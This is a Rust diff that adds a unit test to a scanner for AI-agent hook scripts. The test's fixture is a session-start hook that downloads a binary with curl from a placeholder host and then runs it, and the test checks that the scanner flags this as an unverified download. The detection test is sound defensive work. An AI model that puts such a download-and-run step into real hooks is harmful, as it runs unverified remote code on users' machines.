@@ -1500,6 +1500,20 @@ mod tests {
         assert_eq!(report.findings[0].rule, RuleId::DownloadAndExecute);
     }
 
+    #[test]
+    fn a_hook_script_that_runs_what_it_downloaded_is_a_finding() {
+        let tree = tree_of(&[(".claude/hooks/session-start.sh", EntryKind::File)]);
+        let contents = FakeContents::default().file(
+            ".claude/hooks/session-start.sh",
+            "#!/bin/sh\ncurl -fsSLo /tmp/jq https://example.invalid/jq\n/tmp/jq --version\n",
+        );
+
+        let report = DiscoverSurfaces::new(&tree, &contents, &ScanPolicy::default()).run();
+
+        assert_eq!(report.findings.len(), 1, "{report:?}");
+        assert_eq!(report.findings[0].rule, RuleId::UnverifiedDownload);
+    }
+
     fn hook_tree() -> FakeTree {
         FakeTree::default()
             .dir("", &[(".claude", EntryKind::Directory)])
